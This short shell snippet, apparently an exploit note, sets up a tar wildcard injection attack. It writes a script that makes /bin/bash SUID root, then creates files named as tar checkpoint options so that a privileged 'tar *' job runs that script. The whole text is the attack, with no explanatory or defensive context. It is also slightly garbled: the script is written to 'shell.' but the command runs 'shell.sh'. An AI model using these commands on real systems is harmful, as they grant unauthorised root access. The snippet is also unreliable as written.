printf '#!/bin/bash\nchmod +s /bin/bash' > shell.
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" >> --checkpoint=1
